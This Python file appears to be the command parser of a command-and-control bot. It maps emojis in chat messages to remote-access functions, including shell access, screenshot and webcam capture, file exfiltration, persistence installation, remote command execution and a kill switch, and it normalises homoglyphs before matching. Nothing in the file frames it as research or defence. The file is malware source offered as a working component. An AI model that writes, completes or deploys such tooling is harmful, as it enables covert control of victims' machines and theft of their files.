import unicodedata

# The Protocol
EMOJI_MAP = {
    '🐚': 'cmd_shell',      # System Info
    '📸': 'cmd_screenshot', # Screenshot/Webcam
    '👋': 'cmd_ping',       # Ping
    '📂': 'cmd_exfil',      # Exfiltrate File
    '🔄': 'cmd_persist',    # Install Persistence
    '🛑': 'cmd_exit',       # Kill Switch
    '⚡': 'cmd_exec'         # Remote Command Execution
}

def normalize_homoglyphs(text):
    return unicodedata.normalize('NFKC', text)

def extract_intent(message_content):
    """
    Returns a Tuple: (Command_ID, Argument_String)
    """
    clean_text = normalize_homoglyphs(message_content)
    
    for emoji, cmd_id in EMOJI_MAP.items():
        if emoji in clean_text:
            # Split the message by the emoji
            # Example: "⚡ ipconfig /all" -> ["", " ipconfig /all"]
            try:
                parts = clean_text.split(emoji, 1) # Split only on the first occurrence
                if len(parts) > 1:
                    args = parts[1].strip()
                    if not args: args = None
                    return (cmd_id, args)
            except IndexError:
                return (cmd_id, None)
            
            return (cmd_id, None)
            
    return None